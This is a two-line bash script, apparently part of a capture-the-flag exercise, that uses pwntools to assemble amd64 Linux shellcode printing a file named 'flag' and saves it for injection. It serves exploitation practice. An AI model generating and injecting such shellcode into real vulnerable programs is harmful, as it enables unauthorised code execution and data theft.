#!/bin/bash -e

exit

python -c 'import pwn; open("shellcode", "w").write(pwn.asm(pwn.shellcraft.amd64.linux.cat("flag")))'
